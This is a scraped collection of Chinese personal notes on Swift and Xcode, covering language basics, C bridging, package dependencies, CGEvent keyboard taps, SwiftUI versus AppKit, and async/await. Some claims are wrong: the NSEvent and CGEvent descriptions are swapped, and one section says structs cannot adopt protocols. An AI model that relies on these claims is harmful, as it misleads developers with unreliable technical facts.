可选链 参考: https://www.runoob.com/swift/swift-optional-chaining.html 调用时候使用问号/叹号， 问号表示可能为空， 为空则不继续调用 叹号表示强制调用（最好确定一定可以调用） 注解 这点与ts基本一致 Swift 自动引用计数（ARC） Swift 使用自动引用计数（ARC）这一机制来跟踪和管理应用程序的内存 通常情况下我们不需要去手动释放内存，因为 ARC 会在类的实例不再被使用时，自动释放其占用的内存。 但在有些时候我们还是需要在代码中实现内存管理。 ARC 功能 当每次使用 init() 方法创建一个类的新的实例的时候，ARC 会分配一大块内存用来储存实例的信息。 内存中会包含实例的类型信息，以及这个实例所有相关属性的值。 当实例不再被使用时，ARC 释放实例所占用的内存，并让释放的内存能挪作他用。 为了确保使用中的实例不会被销毁，ARC 会跟踪和计算每一个实例正在被多少属性，常量和变量所引用。 实例赋值给属性、常量或变量，它们都会创建此实例的强引用，只要强引用还在，实例是不允许被销毁的。 类实例之间的循环强引用 循环引用， 永远不会被回收 Swift 提供了两种办法用来解决你在使用类的属性时所遇到的循环强引用问题 弱引用: weak var 变量 无主引用: unowned let 变量 弱引用和无主引用允许循环引用中的一个实例引用另外一个实例而不保持强引用。 这样实例能够互相引用而不产生循环强引用。 对于生命周期中会变为nil的实例使用弱引用。 相反的，对于初始化赋值后再也不会被赋值为nil的实例，使用无主引用。 循环强引用还会发生在当你将一个闭包赋值给类实例的某个属性， 并且这个闭包体中又使用了实例 Swift 类型转换 Swift 语言类型转换可以判断实例的类型。也可以用于检测实例类型是否属于其父类或者子类的实例。 is: 检测值的类型 as: 转换类型 向下转型 向下转型，用类型转换操作符(as? 或 as!) 当你不确定向下转型可以成功时，用类型转换的条件形式(as?)。 条件形式的类型转换总是返回一个可选值（optional value）， 并且若下转是不可能的，可选值将是 nil。 只有你可以确定向下转型一定会成功时，才使用强制形式(as!)。 当你试图向下转型为一个不正确的类型时，强制形式的类型转换会触发一个运行时错误。 Any和AnyObject的类型转换 Swift为不确定类型提供了两种特殊类型别名： AnyObject可以代表任何class类型的实例。 Any可以表示任何类型，包括方法类型（function types）。 只有当你明确的需要它的行为和功能时才使用Any和AnyObject。 在你的代码里使用你期望的明确的类型总是更好的。 Swift 扩展 扩展就是向一个已有的类、结构体或枚举类型添加新功能。 扩展可以对一个类型添加新的功能，但是不能重写已有的功能。 语法 扩展声明使用关键字 extension: extension SomeType { // 加到SomeType的新功能写到这里 } 一个扩展可以扩展一个已有类型，使其能够适配一个或多个协议，语法格式如下: extension SomeType: SomeProtocol, AnotherProctocol { // 协议实现写到这里 } 下面的例子向 Int 类型添加了 5 个计算型实例属性并扩展其功能: extension Int { var add: Int {return self + 100 } var sub: Int { return self - 10 } var mul: Int { return self * 10 } var div: Int { return self / 5 } } let addition = 3.add print(\"加法运算后的值：\\(addition)\") Swift 协议 应该就是接口吧 协议的语法格式如下: protocol SomeProtocol { // 协议内容 } 要使类遵循某个协议，需要在类型名称后加上协议名称，中间以冒号:分隔. 遵循多个协议时，各协议之间用逗号,分隔: struct SomeStructure: FirstProtocol, AnotherProtocol { // 结构体内容 } 如果类在遵循协议的同时拥有父类，应该将父类名放在协议名之前，以逗号分隔: class SomeClass: SomeSuperClass, FirstProtocol, AnotherProtocol { // 类的内容 } 类专属协议 可以在协议的继承列表中,通过添加class关键字,限制协议只能适配到类（class）类型。 该class关键字必须是第一个出现在协议的继承列表中，其后，才是其他继承协议。格式如下: protocol SomeClassOnlyProtocol: class, SomeInheritedProtocol { // 协议定义 } Swift 泛型 类型约束 关联类 使用 associatedtype 关键字来设置关联类型实例 Where 语句 可以在参数列表中通过where语句定义参数的约束 Swift 访问控制 public 可以访问自己模块中源文件里的任何实体，别人也可以通过引入该模块来访问源文件里的所有实体。 internal 可以访问自己模块中源文件里的任何实体，但是别人不能访问该模块中源文件里的实体。 fileprivate 文件内私有，只能在当前源文件中使用。 private 只能在类中访问，离开了这个类或者结构体的作用域外面就无法访问。 枚举类型访问权限 枚举中成员的访问级别继承自该枚举，你不能为枚举中的成员单独申明不同的访问级别。 子类访问权限 子类的访问级别不得高于父类的访问级别。 比如说，父类的访问级别是 internal，子类的访问级别就不能申明为 public。","tags":"后端","url":"/yq-doc-source-docs-rear-end-swift-Basic-grammar.html","loc":"/yq-doc-source-docs-rear-end-swift-Basic-grammar.html"},{"title":"桥接导入C","text":"注解 源于AI, 有空整理 如果你在 Swift 中使用桥接头文件来访问 C 头文件中的宏定义，你可以按照以下步骤进行操作： 创建桥接头文件 在 Xcode 中，创建一个新的头文件（例如 YourProject-Bridging-Header.h）。 在桥接头文件中，使用 #import 或 #include 导入 libproc.h 头文件: #import <libproc.h> 配置桥接头文件： 在 Xcode 项目的 \"Build Settings\"（构建设置）中， 找到 \"Objective-C Bridging Header\"（Objective-C 桥接头文件）设置。 将设置的值指定为桥接头文件的路径，例如 YourProject/YourProject-Bridging-Header.h。 在 Swift 代码中使用宏定义 在 Swift 文件中，你可以通过桥接头文件来访问 libproc.h 中的宏定义。 使用 #if 预处理指令来检查宏定义的值，并在代码中做出相应的处理: #if YOUR_MACRO // 宏定义存在时的处理逻辑 #else // 宏定义不存在时的处理逻辑 #endif 请注意，Swift 是一种不同于 C 的语言，因此在 Swift 文件中无法直接访问 C 头文件中的宏定义。 通过桥接头文件，你可以在 Objective-C 和 Swift 之间建立连接，从而使 Swift 代码能够访问 C 头文件中的宏定义和其他内容。 确保在桥接头文件和 Swift 文件之间设置了正确的路径和配置，以便能够成功访问 libproc.h 中的宏定义","tags":"后端","url":"/yq-doc-source-docs-rear-end-swift-Bridge-guidance-C.html","loc":"/yq-doc-source-docs-rear-end-swift-Bridge-guidance-C.html"},{"title":"命令行工具-创建并运行项目","text":"官网: https://www.swift.org/getting-started/cli-swiftpm/ 平台: MacOS 以创建一个 Hello World 作为说明 项目创建与运行 创建项目: $ mkdir MyCLI $ cd MyCLI $ swift package init --name MyCLI --type executable 生成以下结构目录文件: . ├── Package.swift └── Sources └── main.swift 执行程序: $ swift run MyCLI Building for debugging... [3/3] Linking MyCLI Build complete! (0.68s) Hello, world!","tags":"后端","url":"/yq-doc-source-docs-rear-end-swift-Command-lines-create-and-run-the-project.html","loc":"/yq-doc-source-docs-rear-end-swift-Command-lines-create-and-run-the-project.html"},{"title":"DEBUG条件","text":"用于设置如果是开发(DEBUG)中该做什么, 正式环境该做什么, 如: #if DEBUG print(\"可能没有获取到辅助权限, 确认后请清理后手动获取\") #else // 打开请求辅助权限窗口 let _ = NoAccessView().openInWindow(title: \"请求授权\", sender: self) #endif 如何配置? 打开, 程序配置页面, 选择 Build Settings , 然后可以在 Filter 中 搜索 Custom Flags 如图所示, 还需在 Other Swift Flags 中 设置 Debug 添加 -D DEBUG , 注意不要和Release一起添加","tags":"后端","url":"/yq-doc-source-docs-rear-end-swift-Debug-condition.html","loc":"/yq-doc-source-docs-rear-end-swift-Debug-condition.html"},{"title":"事件类型","text":"HID 事件和会话事件 HID 事件（Human Interface Device Events） HID 事件是指由人机交互设备（如键盘、鼠标、触摸板等）产生的事件。 用途：通过截取 HID 事件，你可以监视和响应用户与输入设备的交互，例如按键、点击、滚动等操作。 会话事件（Session Events）： 会话事件是指与用户登录会话（session）相关的事件，如用户登录、注销、屏幕锁定等。 用途：会话事件主要用于监视和响应用户登录和注销等会话级别的操作，以便执行与会话状态相关的任务或逻辑。 区别： HID 事件是与人机交互设备（输入设备）相关的事件，而会话事件是与用户登录会话（session）相关的事件。 HID 事件是针对用户输入的响应，而会话事件是针对用户登录和注销等会话级别的操作的响应。 HID 事件可以截取和处理，以实现自定义的交互逻辑，而会话事件通常由系统或框架处理。","tags":"后端","url":"/yq-doc-source-docs-rear-end-swift-Event.html","loc":"/yq-doc-source-docs-rear-end-swift-Event.html"},{"title":"增加依赖","text":"方案一 - Xcode: 选择菜单栏的 File > Add Package Dependency , 然后输入仓库URL 参考: https://developer.apple.com/documentation/xcode/adding-package-dependencies-to-your-app 如果没找到的话(不知道为什么我就没有这个项), 就去项目的 General , 下拉找到 Frameworks, Libraries, and Embedded Content , 如图: 然后添加依赖即可 效果就是在根目录下增加一个 Package.resolved 文件: { \"pins\" : [ { \"identity\" : \"keyboardshortcuts\", \"kind\" : \"remoteSourceControl\", \"location\" : \"https://github.com/sindresorhus/KeyboardShortcuts.git\", \"state\" : { \"revision\" : \"c252200141e4abaecf30c14ea474dc009f56d553\", \"version\" : \"1.16.1\" } } ], \"version\" : 2 } 方案二 - 官方包(文件)管理器: 项目根创建 Package.swift 定义依赖项和版本 内容例(主要是两个 dependencies 以及 头部的版本定义): // swift-tools-version: 5.8 // The swift-tools-version declares the minimum version of Swift required to build this package. import PackageDescription let package = Package( name: \"CQ\", dependencies: [ // 指定 tag .package(url: \"https://github.com/sindresorhus/KeyboardShortcuts.git\", from: \"1.16.1\"), // 或者指定 branch // .package(url: \"https://github.com/sindresorhus/KeyboardShortcuts.git\", branch: \"main\") ], targets: [ // Targets are the basic building blocks of a package, defining a module or a test suite. // Targets can depend on other targets in this package and products from dependencies. .executableTarget( name: \"CQ\", dependencies: [ .product(name: \"KeyboardShortcuts\", package: \"keyboardshortcuts\") ], path: \"CQ\"), ] ) 定义好之后执行 swift build 即可 注解 Xcode编辑器可能会提示 PackageDescription 找不到 的报错, 忽略即可 创建发布可参考: https://www.jianshu.com/p/44560fd214d2 部分属性说明: name: 一般就是产品/项目名 dependencies: 依赖路径, 支持多种路径类型: git 源 + 确定的版本号 git 源 + 版本区间 git 源 + Commit 号 git 源 + 分支名 本地路径 targets: 目标, 可以有多个 targets.name: name targets.dependencies: 与上面的依赖不一样, 可以依赖上面 Package.Dependency 的东西或者依赖另一个 target。 所以这里只需要写 Package 或者 Target 的名字字符串（Target.Dependency 这个枚举也实现了 ExpressibleByStringLiteral）。 targets.path: target 的路径，默认为 [PackageRoot]/Sources/[TargetName] targets.source: 源文件路径，默认 TargetName 文件夹下都是源代码文件，会递归搜索 targets.exclude: 需要被排除在外的文件/文件夹，这些文件不会参与编译。 targets.publicHeadersPath: C 家族库的公共头文件地址。 targets.swiftSettings: 定义一个用于特定环境（例如 Debug）的宏，需要设置的话可以去 API 上研究下 targets.linkerSettings: 用于链接一些系统库 这个我失败了不知道为什么 方案三 - Pod管理器: 类似于Java的Maven 安装配置使用参考 ./包管理工具pod","tags":"后端","url":"/yq-doc-source-docs-rear-end-swift-Increase-dependence.html","loc":"/yq-doc-source-docs-rear-end-swift-Increase-dependence.html"},{"title":"官方库","text":"UIKit 移动端用 Cocoa OS x桌面端用 包含 AppKit: 官方文档: https://developer.apple.com/documentation/appkit Foundation SwiftUI 较新的框架, 跨平台支持(桌面/移动) 一些库对象/函数 NSEvent 是Core Graphics框架提供的事件处理类。 一个比较底层的事件类, 用于处理与图形渲染和窗口服务相关的事件。 CGEvent可以用于模拟和处理鼠标、键盘、触摸等低级输入事件。 它提供了更底层的控制，可以直接操作事件的属性，如位置、按键状态等。 CGEvent AppKit框架提供的事件处理类. 是一个较高层的事件处理接口，用于处理与应用程序界面和用户交互相关的事件。 NSEvent提供了一些高级的功能，如自动处理按键重复、多点触控、手势识别等。 它还提供了更高级的事件处理方法，如响应链、事件分发等。 CGEvent.tapCreate 创建一个事件截取, 参考: https://developer.apple.com/documentation/coregraphics/cgevent/1454426-tapcreate 参数列表: (tap: CGEventTapLocation, place: CGEventTapPlacement, options: CGEventTapOptions, eventsOfInterest: CGEventMask, callback: CGEventTapCallBack, userInfo: UnsafeMutableRawPointer?) -> CFMachPort? 主要说一下 eventsOfInterest: CGEventMask , 这个是一个位掩码集合, 标识截取的事件类型, 比如 CGEventMask(1 << NSEvent.EventType.keyDown.rawValue) , 多个事件用 | 整合. 左移一位表示转换为位掩码 其中有一个参数Callable是个回调函数, 用于处理事件 需要返回一个cgEvent的指针(), 函数签名为 CGEventRef (*)(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) (返回一个CGEventRef对象，即一个CGEvent类型的引用) 回调函数负责创建和返回CGEventRef对象，并控制对该对象的内存管理 回调返回的cgEvent有两个可用的修饰: passRetained：在回调函数中，如果你使用passRetained来返回CGEventRef对象，它表示你将内存管理权转移给调用方。 这意味着，调用方需要负责在适当的时候调用CFRelease来释放CGEventRef对象，以确保正确释放内存并避免内存泄漏。 这通常适用于你在回调函数中创建了一个新的CGEventRef对象，并希望调用方负责管理其生命周期。 例如，如果你在回调函数中使用CGEventCreateCopy函数创建了一个新的事件副本，并通过passRetained返回， 那么调用方需要负责在不再需要该事件时调用CFRelease来释放它。 passUnretained：在回调函数中，如果你使用passUnretained来返回CGEventRef对象，它表示你不会转移内存管理权给调用方。 这意味着，调用方不需要调用CFRelease释放CGEventRef对象，因为你保留了对该对象的所有权。 这通常适用于你在回调函数中返回了一个指向全局或静态变量的CGEventRef对象， 或者你从其他地方获取的对象，而不是在回调函数中创建的新对象。 例如，如果你在回调函数中返回一个全局变量中存储的事件对象，或者你通过传递指针参数获取一个事件对象， 然后使用passUnretained返回，那么调用方不需要调用CFRelease释放它。 综上所述，使用passRetained表示你将内存管理权转移给调用方，调用方需要负责释放对象。 而使用passUnretained表示你保留了内存管理权，调用方无需释放对象。 你应根据具体情况选择适当的内存管理方式，以确保正确处理内存生命周期。 (这部分来自AI) 注解 另外自己使用 CGEvent 时, 尽量不要去强转为 NSEvent: let nsEvent = NSEvent(cgEvent: cgEvent), 因为有时候在这转了后, 返回的cgEvent, 在底层调用可能会报错: Assertion failure in -[NSEvent _initWithCGEvent:eventRef:], NSEvent.m:1,846 ... com.apple.NSEventThread (7): EXC_BREAKPOINT (code=1, subcode=0x18307be7c) Assertion failure in -[NSEvent _initWithCGEvent:eventRef:], NSEvent.m:1,846 DispatchQueue 执行任务的调度队列, 支持异步执行 DispatchQueue 是一个用于执行任务的调度队列，它是在Grand Central Dispatch (GCD) 中提供的主要类之一。 GCD是一个用于并发执行任务的底层系统框架，它提供了一种简单而强大的方式来管理并发任务的执行。 DispatchQueue 可以将任务（代码块）安排到不同的队列中，并按照特定的调度方式进行执行。它提供了两种类型的队列： Serial Queue（串行队列）：每次只能执行一个任务，按照任务添加的顺序进行执行。后一个任务会等待前一个任务完成后才能开始执行。 Concurrent Queue（并发队列）：可以同时执行多个任务，并且任务的执行顺序可能不确定。 你可以使用 DispatchQueue 来执行以下类型的任务： 同步任务（Sync Tasks）：任务会在当前线程中同步执行，直到任务执行完毕后才会继续执行后续代码。 异步任务（Async Tasks）：任务会在后台线程中异步执行，不会阻塞当前线程的执行，可以继续执行后续代码。 以下是一个使用 DispatchQueue 的简单示例: let queue = DispatchQueue(label: \"com.example.queue\") // 异步任务 queue.async { // 在后台线程执行的任务 print(\"异步任务\") } // 同步任务 queue.sync { // 在当前线程执行的任务 print(\"同步任务\") } DispatchQueue 还提供了其他功能，如延迟执行任务、调度任务在特定时间或间隔后执行等。 它是在iOS、macOS、watchOS 和 tvOS 开发中进行异步和并发编程的重要工具之一。 比如延时执行也可以: // 延时执行任务 DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) { // 2秒后执行的任务 print(\"延时执行的任务\") } NSViewRepresentable 一个协议，用于在SwiftUI中封装和使用Cocoa（macOS）中的NSView。 它允许开发者通过实现一些必要的方法来创建自定义的NSView，并将其嵌入到SwiftUI视图层级中。 通过遵循NSViewRepresentable协议， 你可以创建一个遵循NSViewRepresentable协议的自定义结构体或类，然后实现以下两个必要的方法： makeNSView(context:)：在这个方法中，你需要创建并返回一个NSView实例。这个方法会在视图第一次被创建时调用。 updateNSView(_:context:)：在这个方法中，你可以根据需要更新NSView的属性和内容。这个方法会在视图的状态发生变化时被调用。 通过实现这些方法，你可以在SwiftUI中使用自定义的NSView， 并在其中使用Cocoa（macOS）提供的各种功能和控件，以满足特定的需求。 View 视图顶级窗口, 注意, 没有提供默认的close方法, 因为官方觉得close不应该由View触发 可以通过以下代码获取到View所在窗体然后关闭: NSWindow(contentViewController: NSHostingController(rootView: self)) NSWindow AppKit的窗口管理 NSHostingController AppKit 中的类，用于在 macOS 应用程序中承载 SwiftUI 视图。 它是一个 AppKit 视图控制器，用于在 AppKit 应用程序中托管和管理 SwiftUI 视图。 通过将 SwiftUI 视图嵌入到 NSHostingController 中，可以在 AppKit 应用程序的视图层次结构中使用 SwiftUI 视图。 ZStack与VStack ZStack 一个3D的布局方式, 比如有三个图标, 后者会叠放在前者上 VStack 垂直布局方式, 比如有三个图标, 后者会垂直排列与前者 支持的块 Settings 块 用于定义应用程序的设置场景，它是一个视图构造器，用于自定义应用程序的设置界面。 通过在 Settings 块中添加视图来创建自定义的设置界面，以供用户配置和调整应用程序的各种选项。 WindowGroup 块 WindowGroup 块用于定义应用程序的主窗口场景。 在 WindowGroup 块中，你可以指定应用程序的主窗口的内容视图以及其他与窗口相关的属性。 Scene 块 Scene 块用于定义应用程序的场景，它可以包含一个或多个窗口组。 你可以在 Scene 块中定义应用程序的场景配置、窗口管理和生命周期处理。 NavigationView 块 NavigationView 块用于创建具有导航功能的视图层次结构。 在 NavigationView 块中，你可以使用 NavigationView 的修饰符和子视图来定义导航栏、导航链接以及其他与导航相关的界面元素。 Form 块 Form 块用于创建表单视图，用于显示和收集用户的输入。 在 Form 块中，你可以使用 Form 的修饰符和子视图来创建表单字段、分组和其他与表单相关的界面元素。 List 块 List 块用于创建可滚动的列表视图。 在 List 块中，你可以使用 List 的修饰符和子视图来定义列表项、分组和其他与列表相关的界面元素。 ForEach 块 ForEach 块用于在列表或视图中迭代和显示集合中的元素。 在 ForEach 块中，你可以使用 ForEach 的修饰符和子视图来定义每个元素的显示方式和交互行为。 SwiftUI 与 AppKit SwiftUI 和 AppKit 是 Apple 提供的两个不同的框架， 用于构建 macOS 应用程序的用户界面。它们在设计和开发理念上有一些区别。 声明性 UI：SwiftUI 是一个基于声明性 UI 的框架， 它使用简洁的代码和声明式的方式来描述用户界面。 你可以使用 SwiftUI 的各种视图和修饰符来构建用户界面， 并且它会自动处理视图状态和布局，以及与用户交互的响应。 而 AppKit 是一个基于命令式的 UI 框架，你需要编写更多的代码来手动管理视图的状态和布局。 跨平台支持：SwiftUI 是一个跨平台框架， 除了 macOS，它还可以用于构建 iOS、iPadOS、watchOS 和 tvOS 应用程序。 这意味着你可以使用相同的代码和技术来开发多个平台上的应用程序。 而 AppKit 是专门为 macOS 设计的框架，不支持其他平台。 响应式布局：SwiftUI 的布局系统是响应式的， 它使用了一种叫做 \"容器视图\" 的概念，可以自动适应不同的屏幕尺寸和设备方向。 这使得开发适应性更强的用户界面变得更加容易。 AppKit 的布局系统相对较为传统，需要手动处理不同的屏幕尺寸和设备方向。 预览功能：SwiftUI 提供了一个强大的预览功能，可以在开发过程中实时预览和调试用户界面。 你可以在 Xcode 中查看 SwiftUI 视图在不同设备上的外观，并即时查看代码更改的效果。 这对于迭代开发和快速调试非常有帮助。AppKit 并没有提供类似的预览功能。 尽管 SwiftUI 在设计上有一些新颖的概念和优势， 但在某些情况下，仍然需要使用 AppKit 来构建更复杂和定制化的 macOS 应用程序。 AppKit 拥有更多的功能和灵活性","tags":"后端","url":"/yq-doc-source-docs-rear-end-swift-Official-library.html","loc":"/yq-doc-source-docs-rear-end-swift-Official-library.html"},{"title":"swift3.x升级到5.x","text":"先去 App Store 下载 Swiftify for Xcode : https://apps.apple.com/cn/app/swiftify-for-xcode/id1183412116?mt=12 先注册: https://swiftify.com/profile/api-key/ 主要是要获取一个API KEY 配置: 系统偏好设置 => \"扩展\"中为Xcode Source Editor(Xcode源码编辑器)选择\"Swiftyfy for Xcode\" 打开Xcode => Editor => 菜单下看到新的\"Swiftify\"子菜单 好吧不行, 坑, 这是 object-c => swift 的","tags":"后端","url":"/yq-doc-source-docs-rear-end-swift-SWIFT3.X-upgrades-to-5.x.html","loc":"/yq-doc-source-docs-rear-end-swift-SWIFT3.X-upgrades-to-5.x.html"},{"title":"swift结构体与类的使用区别","text":"结构体: 值类型, 当你创建结构体的实例时，它会创建该结构的深拷贝; 即使将其赋值给其他变量, 也是创建一个值的拷贝 结构体的成员默认是不可变的（immutable），除非你明确地使用关键字mutating来标记 结构体不能继承自其他结构体或类，也不能实现协议（protocol）。 但是，你可以在结构体中定义一个名为init的函数来实现初始化逻辑。 类 引用类型, 当你创建类的实例时，它创建的是对类类型的引用(多个引用执行同一个值) 类的成员默认是可变的（mutable） 类可以继承自其他类或实现协议 使用场景 结构体：结构体通常用于表示简单的数据模型， 如几何形状或货币单位，其中重点是数据而不是行为。 结构体的行为通常通过函数和计算属性来定义。 类：类通常用于表示更复杂的概念， 如人类、动物或汽车等，其中重点是行为和状态。 类可以拥有实例方法和类方法，以及属性（可以是可变的或不可变的）。","tags":"后端","url":"/yq-doc-source-docs-rear-end-swift-Swift-structure-and-class-difference.html","loc":"/yq-doc-source-docs-rear-end-swift-Swift-structure-and-class-difference.html"},{"title":"一些好用三方库","text":"KeyboardShortcuts 键盘事件处理库: https://swiftpackageindex.com/sindresorhus/KeyboardShortcuts 支持全局快捷键的监听, 完美支持MacOS的沙盒","tags":"后端","url":"/yq-doc-source-docs-rear-end-swift-Three--party-library.html","loc":"/yq-doc-source-docs-rear-end-swift-Three--party-library.html"},{"title":"使用SPM(Swift Package Manager)","text":"Swift Package Manager (SPM) 注解 源于AI, 有空整理 如果你想在 Swift Package Manager (SPM) 中导入 C 代码，你可以按照以下步骤进行操作： 创建 Swift 包 在你的项目目录中，打开终端或命令提示符。 使用 cd 命令导航到你的项目目录。 运行以下命令创建一个新的 Swift 包: swift package init 或者直接在xcode创建 配置 Swift 包 在项目目录中，使用文本编辑器打开 Package.swift 文件。 在 Package.swift 文件中，配置 Swift 包的名称、目标和依赖项等信息。 在 targets 数组中，定义你的目标及其相关设置，例如模块名称、源文件路径等。 在 Swift 包中创建 C 源文件 在你的 Swift 包目录中，创建一个包含 C 代码的源文件，例如 YourPackage/Sources/YourPackage/CFile.c。 在 C 源文件中，编写你的 C 代码。 更新 Swift 包配置文件 在 Package.swift 文件中，将 C 源文件添加到 Swift 包的目标中。 修改 targets 数组中的目标配置，添加 C 源文件的路径: // Package.swift // ... targets: [ .target( name: \"YourPackage\", dependencies: [], cSettings: [ .headerSearchPath(\"YourPackage/Sources/YourPackage\"), .unsafeFlags([\"-Xclang\", \"-fmodule-map-file=YourPackage/Sources/YourPackage/module.modulemap\"]), ] ), // ... ], 创建模块映射文件 在 Swift 包目录中，创建一个名为 module.modulemap 的模块映射文件， 例如 YourPackage/Sources/YourPackage/module.modulemap。 在模块映射文件中，指定你的 C 源文件的导入方式: // module.modulemap module YourPackage [system] { header \"CFile.h\" export * } 导入 C 代码 在你的 Swift 代码中，使用 import 语句导入你的 Swift 包。 现在你可以在 Swift 代码中使用导入的模块和其中的 C 代码: // Swift 代码 import YourPackage // 使用导入的模块和其中的 C 代码 通过以上步骤，你可以使用 Swift Package Manager 导入和使用 C 代码。 确保在 Swift 包的配置文件中正确指定了 C 源文件的路径，并使用模块映射文件来定义导入方式。 请注意，使用 Swift Package Manager 导入 C 代码需要适当的配置和目录结构， 并且需要在模块映射文件中正确定义 C 源文件的导入方式。 确保你的 C 代码可以正确编译和链接，并在 Swift 代码中按照适当的方式使用。","tags":"后端","url":"/yq-doc-source-docs-rear-end-swift-Use-SPM-(Swift-Package-Manager).html","loc":"/yq-doc-source-docs-rear-end-swift-Use-SPM-(Swift-Package-Manager).html"},{"title":"使用modulemap导入C++框架","text":"自己使用modulemap只导入某一个头文件, 文件是位于SDK库的 libproc.h , 奈何一直失败, 故放弃.... 贴一些相关的资料: Importing Headers from a C++ Package Target Mixing Languages in an Xcode project Importing C++ into Swift 反正是看了一圈, 好像没直接支持的, 如果要拿出来弄成target或者框架啥的, 就好麻烦, 毕竟只需要导那一个..., 暂时先桥接处理吧 使用modulemap 大致两步流程 编写 modulemap 文件, 命名为 module.modulemap (在xcode新建会自带后缀) 在 TARGETS 下配置 Swift Compiler - Search Paths 为modulemap文件所在目录 详细说明 modulemap 不止可以使用在 C++, 也可以是C, 也不止是包和框架, 还可以直接在当前项目内直接新拉一个组用, 但是最重要的一点, 文件名只能定义为 `module` 另外需配置 Swift Compiler - Search Paths 为modulemap文件所在目录, 以根目录下 Modules/module.modulemap 为例 (且一定要选 TARGETS 而不是 PROJECT ): $(SRCROOT)/Modules 重要 modulemap文件名只能叫 module module.modulemap内容示例: module ProcInfo { header \"tt.h\" export * } 其他说明 有个新的问题, 就是在自定义的头文件, 无法导入其他头文件并正常使用, 以导入SDK库的libproc为例: // tt.h #ifndef tt_h #define tt_h //#include <libproc.h> //#import <libproc.h> #import </Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX14.2.sdk/usr/include/libproc.h> // 不知道为啥, 就是找不到sdk包里面的 libproc... #define NAME \"YQ\" #define NAME2 \"YQ\" #define PROC_PIDPATHINFO_MAXSIZE PROC_PIDPATHINFO_MAXSIZE #define PROC_Q_MAXSIZE PROC_PIDPATHINFO_MAXSIZE #define SIZEYQ \"PROC_PIDPATHINFO_MAXSIZE\" #endif /* tt_h */ 不管 import 怎么写, 不管在 header path怎么设置, 哪怕是直接导入绝对路径, cmd + click 都找不到... 最后尝试了一下在swift中使用, 发现一个问题, 就是虽然头文件中没发直接按住Command键并单击来导航到导入的头文件, 但是代码中可以拿到部分值 注解 无法通过 按住Command键并单击来 自定义头文件中引入的头文件来确定是否成功导入, 貌似根本没发在项目支持.","tags":"后端","url":"/yq-doc-source-docs-rear-end-swift-Use-moduleMap-to-import-the-C-++-framework.html","loc":"/yq-doc-source-docs-rear-end-swift-Use-moduleMap-to-import-the-C-++-framework.html"},{"title":"Xcode的Info配置","text":"配置位置 这里配置时, 会自动新建一个info.plist文件. 若这里没有相应的选项, 那么可点击任意条目的 + 进行新增, 如图: 下面介绍常见条目作用 Application is agent (UIElement): boolean 用来将应用程序设置为代理（agent）应用程序。 应用程序将以无窗口的形式运行，并且不会在 Dock 中显示应用程序图标。 通常用于实现后台任务、系统级别的服务或菜单栏应用程序等。 代理应用程序在后台运行，不会干扰用户的工作流程，但仍然可以提供某些功能或服务。 隐藏应用程序图标：设置应用程序为代理应用程序后，应用程序的图标将不会显示在 Dock 中，从而不会占用 Dock 的空间 无窗口运行：代理应用程序通常不需要显示窗口，因此它们以无窗口的形式运行，不会在屏幕上显示用户界面。 后台任务：代理应用程序可以在后台执行任务，例如监控系统事件、定时任务、网络请求等。 系统级别的服务：代理应用程序可以提供系统级别的服务，例如全局快捷键监听、剪贴板操作、菜单栏扩展等。 额外作用: 窗口默认支持 显示在其他全屏应用上方 (可能是因为属于系统级)","tags":"后端","url":"/yq-doc-source-docs-rear-end-swift-Xcode's-Info-configuration.html","loc":"/yq-doc-source-docs-rear-end-swift-Xcode's-Info-configuration.html"},{"title":"Xcode删除掉强制证书","text":"Xcode删除掉强制证书/删除掉强制团队验证 先关闭掉xcode项目, 然后用文本编辑器比如vscode打开 项目配置文件 xxx.xcodeproj , 全局搜索并更新为以下字段: # 这个这样改 CODE_SIGN_STYLE = Manual; # 这些直接删除也可 CODE_SIGN_IDENTITY = \"\" DEVELOPMENT_TEAM = \"\" PROVISIONING_PROFILE_SPECIFIER = \"\"; 原来的内容也贴一下做个参考: CODE_SIGN_STYLE = Automatic; # 最主要就是这个和TEAM CODE_SIGN_IDENTITY = \"Apple Development\"; DEVELOPMENT_TEAM = \"\"; PROVISIONING_PROFILE_SPECIFIER = \"\"; 注解 不要在xcode项目打开的时候改, 不然会修改失败(多半会被内存中的覆盖掉) 重新打开xcode, 在 Target 中看看对不对, 不对就按这样选择 以及在 build setting 中的 Signing 设置下 注解 顺便吐槽一句, xcode 太难用","tags":"后端","url":"/yq-doc-source-docs-rear-end-swift-Xcode-delete-the-compulsory-certificate.html","loc":"/yq-doc-source-docs-rear-end-swift-Xcode-delete-the-compulsory-certificate.html"},{"title":"Xcode-分发打包","text":"Xcode版本: 15.1(15C65) 当前版本 在此位置编辑Schema 或者在 Product - Schema 编辑Schema Product - Archive 进行打包 打包位置 然后会进入 Archive 界面, 选择 Distribute App 注意, Archive 界面也可以通过 Window - Organizer 进入: 没购买官方开发者账号的就选 Custom 来导出副本到本地 正规App开发者账号上传后续可以参考: https://zhuanlan.zhihu.com/p/583812511","tags":"后端","url":"/yq-doc-source-docs-rear-end-swift-Xcode-distribution-packaging.html","loc":"/yq-doc-source-docs-rear-end-swift-Xcode-distribution-packaging.html"},{"title":"xcode15新功能","text":"预览宏-Preview 新版本如果要预览 swiftUI, 直接: #Preview { ContentView() } 即可 参考: https://juejin.cn/post/7244109491897401381","tags":"后端","url":"/yq-doc-source-docs-rear-end-swift-Xcode15-new-features.html","loc":"/yq-doc-source-docs-rear-end-swift-Xcode15-new-features.html"},{"title":"Swift异步","text":"于Python类似, 高版本也支持使用async(await)来定义(调用)异步函数: func fetchData() async -> String { // 模拟异步操作，比如从网络获取数据 await Task.sleep(1_000_000_000) // 模拟1秒的延迟 return \"Data fetched successfully\" } 当在异步上下文中调用时, 除了直接await, 还可以: async { print(\"Async code block\") let result = try await someAsyncFunction() print(\"Result: \\(result)\") } 如果要在同步上下文中调用, 可以使用 Task 或者 Task.runDetached : Task.runDetached { print(\"Before calling asyncTask\") await asyncTask() print(\"After calling asyncTask\") } Task { print(\"Before calling asyncTask\") await asyncTask() print(\"After calling asyncTask\") } 两者区别在于它们的任务分离性和运行方式 任务分离性： Task.runDetached: 创建一个分离的任务，该任务不会等待其完成， 它会在后台执行，不会阻塞当前线程。 这意味着主线程或当前上下文中的代码可以继续执行而不等待任务完成。 Task: 在当前上下文中创建一个任务，它的行为类似于一个子任务。 如果你在一个任务中调用另一个任务，并使用 await 来等待它的完成， 那么它会在当前任务中被等待，不会分离执行 运行方式： Task.runDetached: 